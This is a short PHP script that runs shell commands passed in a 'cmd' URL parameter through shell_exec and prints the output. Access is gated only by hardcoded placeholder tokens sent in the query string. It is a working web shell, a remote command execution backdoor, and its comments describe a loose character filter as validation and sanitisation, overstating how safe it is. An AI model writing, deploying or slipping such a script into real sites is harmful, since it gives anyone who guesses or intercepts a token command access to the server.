<?php
// Define valid access tokens
$valid_tokens = ['token1', 'token2', 'token3']; // Add more tokens as needed

// Authentication mechanism to prevent unauthorized access
if (!isset($_GET['token']) || !in_array($_GET['token'], $valid_tokens)) {
    http_response_code(403); // Forbidden
    die("Unauthorized access.");
}

// Command execution mechanism
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = '';

    // Validate and sanitize the command
    if (preg_match('/^[a-zA-Z0-9\s_-]+$/', $cmd)) {
        // Execute the command
        $output = shell_exec($cmd);
    } else {
        $output = "Invalid command format.";
    }

    // Output the result
    echo "<pre>$output</pre>";
}
?>
